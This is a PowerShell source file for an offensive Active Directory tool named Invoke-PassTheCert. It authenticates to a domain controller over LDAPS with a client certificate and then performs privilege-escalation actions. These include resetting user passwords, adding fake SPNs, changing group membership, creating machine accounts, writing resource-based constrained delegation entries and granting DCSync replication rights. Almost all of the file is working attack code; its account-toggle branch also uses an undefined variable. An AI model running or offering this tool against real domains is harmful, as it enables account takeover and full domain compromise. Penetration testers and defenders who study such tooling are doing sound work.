function Invoke-PassTheCert {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Server,
        
        [Parameter(Mandatory = $true)]
        [string]$Certificate,
        
        [Parameter(Mandatory = $false)]
        [string]$CertificatePassword,
        
        [Parameter(Mandatory = $false)]
        [switch]$Whoami,

        [Parameter(Mandatory = $false)]
        [string]$ResetPassword,

        [Parameter(Mandatory = $false)]
        [string]$AddSPN,

        [Parameter(Mandatory = $false)]
        [string]$RemoveSPN,

        [Parameter(Mandatory = $false)]
        [string]$AddToGroup,

        [Parameter(Mandatory = $false)]
        [string]$RemoveFromGroup,

        [Parameter(Mandatory = $false)]
        [string]$GroupDN,

        [Parameter(Mandatory = $false)]
        [string]$ToggleAccountStatus,

        [Parameter(Mandatory = $false)]
        [string]$AddComputer,

        [Parameter(Mandatory = $false)]
        [string]$ComputerPassword,

        [Parameter(Mandatory = $false)]
        [string]$RemoveComputer,

        [Parameter(Mandatory = $false)]
        [string]$AddRBCD,

        [Parameter(Mandatory = $false)]
        [string]$RemoveRBCD,

        [Parameter(Mandatory = $false)]
        [string]$SID,

        [Parameter(Mandatory = $false)]
        [string]$Elevate
    )


    function Get-RandomString { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }

    Write-Output ""
    Write-Output ""

    Add-Type -AssemblyName System.DirectoryServices.Protocols


    try {
        
        Write-Output "[*] Attempting to load certificate..."
        
        if (Test-Path -Path $Certificate) {

            $LoadedCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($Certificate, $CertificatePassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
        
        }
        else {
            $CertificateBytes = [System.Convert]::FromBase64String($Certificate)  
            $LoadedCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertificateBytes, $CertificatePassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
        }

        Write-Output "[*] Certificate successfully imported"
    
    }
    catch { return "[!] Unable to load Certificate" }

    # Configure LDAP connection
    Write-Output "[*] Configuring LDAP connectivity to $Server"
    $LdapIdentifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($Server, 636)
    $LdapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($LdapIdentifier)

    # Set certificate authentication
    $LdapConnection.ClientCertificates.Add($LoadedCertificate) > $null
    $LdapConnection.SessionOptions.SecureSocketLayer = $true
    $LdapConnection.SessionOptions.VerifyServerCertificate = { return $true }

    Write-Output ""

    try {

        if ($Whoami) {
        
            $WhoamiRequest = New-Object System.DirectoryServices.Protocols.ExtendedRequest("1.3.6.1.4.1.4203.1.11.3")
            $Response = $LdapConnection.SendRequest($WhoamiRequest)
                
            if ($Response.ResponseValue) {
                
                $WhoamiResult = [System.Text.Encoding]::UTF8.GetString($Response.ResponseValue)
                return "Authenticated as: $WhoamiResult"
            
            }
        }

        if ($ResetPassword) {
        
            try {
                
                $NewPassword = Get-RandomString { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                $NewPasswordBytes = [System.Text.Encoding]::Unicode.GetBytes('"' + $NewPassword + '"')           
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($ResetPassword, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "unicodePwd", $NewPasswordBytes)
                $LdapConnection.SendRequest($ModifyRequest) > $null
                
                return "[*] Successfully reset password for $ResetPassword to $NewPassword"
            
            }
            
            catch { return "[!] Failed to reset password for $ResetPassword : $_" }
        }

        if ($AddSPN) {

            try {
        
                $NewSPN = "cifs/fake.domain.com"
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($AddSPN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, "servicePrincipalName", $NewSPN)
                $LdapConnection.SendRequest($ModifyRequest) > $null
                return "[*] Successfully set SPN ""cifs/fake.domain.com"" for user $AddSPN"
            }
            
            catch { return "[!] Failure : $_" }
        }

        if ($RemoveSPN) {

            try {
        
                $Spn = "cifs/fake.domain.com"
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($RemoveSPN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, "servicePrincipalName", $Spn)
                $LdapConnection.SendRequest($ModifyRequest) > $null
                return "[*] Successfully Unset SPN ""cifs/fake.domain.com"" for user $RemoveSPN"
            }
            
            catch { return "[!] Failure : $_" }
        }

        if ($AddToGroup) {

            try {
        
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($GroupDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, "member", $AddToGroup)
                $LdapConnection.SendRequest($ModifyRequest) > $null
                return "[*] Successfully added $AddToGroup to group $GroupDN"
            }
            
            catch { return "[!] Failure : $_" }
        }

        if ($RemoveFromGroup) {

            try {
        
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($GroupDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, "member", $RemoveFromGroup)
                $LdapConnection.SendRequest($ModifyRequest) > $null
                return "[*] Successfully removed $RemoveFromGroup to group $GroupDN"
            }
            
            catch { return "[!] Failure : $_" }
        }

        if ($ToggleAccountStatus) {

            try {
        
                $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
                $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
                
                $SearchRequest = [System.DirectoryServices.Protocols.SearchRequest]::new($ToggleAccountStatus, "(|(objectClass=user)(objectClass=computer))", [System.DirectoryServices.Protocols.SearchScope]::Subtree, "userAccountControl")
                $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
        
                if ($SearchResponse.Entries.Count -gt 0) {
                    $SearchResultEntry = $SearchResponse.Entries[0]
                    $UserStatus = $SearchResultEntry.Attributes["userAccountControl"][0]
        
                    [int]$UserAccountControl = [int]($SearchResultEntry.Attributes["userAccountControl"][0].ToString())
                    [int]$AccountDisable = 0x0002;
        
                    # Check if account is disabled and toggle status
                    if (($UserAccountControl -band $AccountDisable) -gt 0) {
        
                        # Currently disabled - enable it (bitwise AND with NOT flag)
                        $UserAccountControl = $UserAccountControl -band (-bnot $AccountDisable)
        
                        $UAC = $CurrentUAC -band (-bnot 0x0002)
                        $UAC = $UAC.ToString()
        
                        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($ToggleAccountStatus, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "userAccountControl", $UAC)
                        $LdapConnection.SendRequest($ModifyRequest) > $null
        
                        return "[*] Enabled Account $ToggleAccountStatus"
                    }
                    
                    else {
        
                        # Currently enabled - disable it (bitwise OR with flag)
                        $UserAccountControl = $UserAccountControl -bor $AccountDisable
        
                        $UAC = $CurrentUAC -bxor 0x0002
                        $UAC = $UAC.ToString()
        
                        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($ToggleAccountStatus, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "userAccountControl", $UAC)
                        $LdapConnection.SendRequest($ModifyRequest) > $null
        
                        return "[*] Disabled Account $ToggleAccountStatus"
                    }
                }
                
                else { return "[!] DistinguishedName $ToggleAccountStatus not found" }
            }
            
            catch { return "[!] Failure : $_" }
        }
        
        if ($AddComputer) {
        
            try {
        
                $ComputerName = "$AddComputer"
                if ($ComputerPassword -eq "") { $ComputerPassword = Get-RandomString }
        
                $Password = [System.Text.Encoding]::Unicode.GetBytes('"' + $ComputerPassword + '"')
                $UnicodePwd = [byte[]]$Password  # Store the Unicode password correctly
        
                $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
                $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
                $Domain = ($SearchBase -split ',' -replace '^DC=', '' -join '.')
                $ComputerHostname = $ComputerName.TrimEnd('$')
                [string]$ComputerDN = "CN=$ComputerHostname,CN=Computers,$SearchBase"
        
                $Spns = @("HOST/$ComputerHostname", "HOST/$ComputerHostname.$Domain", "RestrictedKrbHost/$ComputerHostname", "RestrictedKrbHost/$ComputerHostname.$Domain")
        
                $AddRequest = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
                $AddRequest.DistinguishedName = $ComputerDN        
                $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass", "Computer")) > $null
                $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "SamAccountName", "$ComputerHostname$")) > $null
                $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "userAccountControl", "4096")) > $null  # Normal computer account
                $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "DnsHostName", "$ComputerHostname.$Domain")) > $null
                $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "ServicePrincipalName", $Spns)) > $null
                $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "unicodePwd", $UnicodePwd)) > $null
        
                $LdapConnection.SendRequest($AddRequest) > $null
        
                Write-Output "[*] Computer account successfully added to the domain."
        
                $ComputerResults = New-Object PSObject
                $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ComputerName
                $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $ComputerPassword
                $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "DN" -Value $ComputerDN
                $ComputerResults | FT -AutoSize
            
                return
            }
            
            catch { return "[!] Failure Adding Computer Account: $_" }
        }
        
        if ($RemoveComputer) {
            try {
        
                if ((Read-Host "Pending deletion of object: ""$RemoveComputer"". Would you like to continue? (Y/N)").ToUpper() -ne 'Y') { 
                    return "[*] Gracefully exited.." 
                }
        
                $DeleteRequest = New-Object System.DirectoryServices.Protocols.DeleteRequest("$RemoveComputer")
                $LdapConnection.SendRequest($DeleteRequest) > $null
        
                return "[*] Successfully removed ""$RemoveComputer"" from the domain."
            }
            
            catch { return "[!] Failure: $_" }
        }
        
        if ($AddRBCD) {
        
            if ($SID -eq "") {
                
                return "[*] A SID is required to grant rights to ""-SID S-1-5-21-13999771-2333344039-1820745628-1150"""
            
            }
        
            try {
        
                $TargetDN = $AddRBCD
        
                $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($TargetDN, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "msDS-AllowedToActOnBehalfOfOtherIdentity")
                $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
        
                if ($SearchResponse.Entries.Count -gt 0 -and $SearchResponse.Entries[0].Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"]) {
                    if ((Read-Host "[*] msDS-AllowedToActOnBehalfOfOtherIdentity is already populated. Would you like to continue? (Y/N)").ToUpper() -ne 'Y') { 
                        return "[*] Gracefully exited.." 
                    }
                }
                
                $Rsd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)")
                $Rsdb = New-Object byte[] ($Rsd.BinaryLength)
                $Rsd.GetBinaryForm($Rsdb, 0)
        
                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                $Modification.Add($Rsdb) > $null
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
        	
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, $Modification)
        
                try {
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[+] msDS-AllowedToActOnBehalfOfOtherIdentity successfully added on ""$TargetDN"" for SID: $SID"
                }
                
                catch { return "[!] msDS-AllowedToActOnBehalfOfOtherIdentity modification failed: $_" }
            }
            
            catch { return "[!] Failure : $_" }
        }
        
        if ($RemoveRBCD) {
            try {
                $TargetDN = $RemoveRBCD
                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, $Modification)
            	
                $LdapConnection.SendRequest($ModifyRequest) > $null
                return "[+] msDS-AllowedToActOnBehalfOfOtherIdentity Removed from $TargetDN"
            }
            
            catch { return "[!] msDS-AllowedToActOnBehalfOfOtherIdentity modification failed: $_" }
        }
        
        if ($Elevate) {
            try {
                $UserToElevate = $Elevate
                Write-Output "[*] Retrieving SID of user $UserToElevate"
                
                $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($UserToElevate, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "objectSid")
            	
                try {
                    $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
            		
                    if ($SearchResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { throw "Failed to retrieve user SID: $($userResponse.ResultCode)" }
                    $UserEntry = $SearchResponse.Entries[0]
                    $UserSidBytes = $UserEntry.Attributes["objectSid"][0]
                    $UserSid = New-Object System.Security.Principal.SecurityIdentifier($UserSidBytes, 0)
                    
                    Write-Output "[*] User SID: $($UserSid.Value)"
                }
                
                catch { return "[!] Error retrieving user SID: $_" }
        	
                $DomainDN = ($UserToElevate -split ',' | Where-Object { $_ -like 'DC=*' }) -join ','
                Write-Output "[*] Domain DN: $DomainDN"
        	
                # Retrieve domain's security descriptor
                Write-Output "[*] Retrieving security descriptor for domain $DomainDN"
                $SearchDomainRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($DomainDN, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "nTSecurityDescriptor")
        	
                try {
                    $DomainResponse = $LdapConnection.SendRequest($SearchDomainRequest)
            	
                    if ($DomainResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { return "Failed to retrieve domain security descriptor: $($DomainResponse.ResultCode)" }
        	
                    $DomainEntry = $DomainResponse.Entries[0]
                    $SdBytes = $DomainEntry.Attributes["nTSecurityDescriptor"][0]
                    $Sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($SdBytes, 0)
        	
                    Write-Output "[*] Retrieved current security descriptor"
                }
                
                catch { return "[!] Error retrieving domain security descriptor: $_" }
        	
                # Define DCSync GUIDs
                $GetChangesGuid = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
                $GetChangesAllGuid = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
        	
                # Create ACEs
                $Ace1 = New-Object System.Security.AccessControl.ObjectAce(
                    [System.Security.AccessControl.AceFlags]::None,
                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                    0x100,
                    $UserSid,
                    [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                    $GetChangesGuid,
                    [Guid]::Empty,
                    $false,
                    $null
                )
        	
                $Ace2 = New-Object System.Security.AccessControl.ObjectAce(
                    [System.Security.AccessControl.AceFlags]::None,
                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                    0x100,
                    $UserSid,
                    [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                    $GetChangesAllGuid,
                    [Guid]::Empty,
                    $false,
                    $null
                )
        	
                # Add ACEs to DACL
                $Sd.DiscretionaryAcl.InsertAce(0, $Ace1)
                $Sd.DiscretionaryAcl.InsertAce(0, $Ace2)
            	
                Write-Output "[*] Added DCSync ACEs to security descriptor"
        	
                # Convert security descriptor to byte array
                $NewSd = New-Object byte[] $Sd.BinaryLength
                $Sd.GetBinaryForm($NewSd, 0)
        	
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($DomainDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "nTSecurityDescriptor", $NewSd)
        	
                try {
                    Write-Output "[*] Attempting to modify domain security descriptor"
                    $ModifyResponse = $LdapConnection.SendRequest($ModifyRequest)
                    
                    if ($ModifyResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { return "[!] Failed to modify security descriptor: $($ModifyResponse.ResultCode)" }
                    else { return "[+] Successfully granted DCSync rights to $UserToElevate" }
                }
                
                catch { return "[!] Error modifying security descriptor: $_" }
            }
            
            catch { return "[!] Failure: $_" }
        }
    }
    
    finally { $LdapConnection.Dispose() }
}
